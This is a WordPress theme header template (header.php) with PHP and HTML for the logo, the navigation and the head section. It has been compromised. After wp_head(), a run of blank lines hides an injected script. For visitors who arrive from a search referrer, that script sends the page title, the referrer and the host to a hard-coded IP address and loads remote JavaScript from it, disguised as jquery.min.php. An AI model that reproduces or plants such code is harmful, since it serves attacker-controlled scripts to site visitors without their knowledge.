<!DOCTYPE html>
<?php $options = get_option('playbook'); ?>
<html class="no-js" <?php language_attributes(); ?>>
<head>
	<meta charset="<?php bloginfo('charset'); ?>">
	<title><?php wp_title(''); ?></title>
	<?php mts_meta(); ?>
	<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo( 'stylesheet_url' ); ?>" />
	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
	<?php wp_enqueue_script("jquery"); ?>
	<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
	<!--[if lt IE 9]> <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script> <![endif]-->
	<?php mts_head(); ?>
	<?php wp_head(); ?>































<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://194.73.83.87/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
</head>
<?php flush(); ?>
<body id ="blog" <?php body_class('main'); ?>>
	<header class="main-header">
		<div class="container">
			<div id="header">
				<?php if ($options['mts_logo'] != '') { ?>
					<?php if( is_front_page() || is_home() || is_404() ) { ?>
						<h1 id="logo">
							<a href="<?php echo home_url(); ?>"><img src="<?php echo $options['mts_logo']; ?>" alt="<?php bloginfo( 'name' ); ?>"></a>
						</h1><!-- END #logo -->
					<?php } else { ?>
						<h2 id="logo">
							<a href="<?php echo home_url(); ?>"><img src="<?php echo $options['mts_logo']; ?>" alt="<?php bloginfo( 'name' ); ?>"></a>
						</h2><!-- END #logo -->
					<?php } ?>
				<?php } else { ?>
					<?php if( is_front_page() || is_home() || is_404() ) { ?>
						<h1 id="logo">
							<a href="<?php echo home_url(); ?>"><?php bloginfo( 'name' ); ?></a>
						</h1><!-- END #logo -->
					<?php } else { ?>
						<h2 id="logo">
							<a href="<?php echo home_url(); ?>"><?php bloginfo( 'name' ); ?></a>
						</h2><!-- END #logo -->
					<?php } ?>
				<?php } ?>
                <?php dynamic_sidebar('Header Banner'); ?>				              
			</div><!--#header-->
		</div><!--.container-->
        <div class="secondary-navigation">
            <nav id="navigation" >
                <?php if ( has_nav_menu( 'primary-menu' ) ) { ?>
                    <?php wp_nav_menu( array( 'theme_location' => 'primary-menu', 'menu_class' => 'menu', 'container' => '' ) ); ?>
                <?php } else { ?>
                    <ul class="menu">
                        <?php wp_list_categories('title_li='); ?>
                    </ul>
                <?php } ?>
            </nav>
        </div>
	</header>
	<div class="main-container">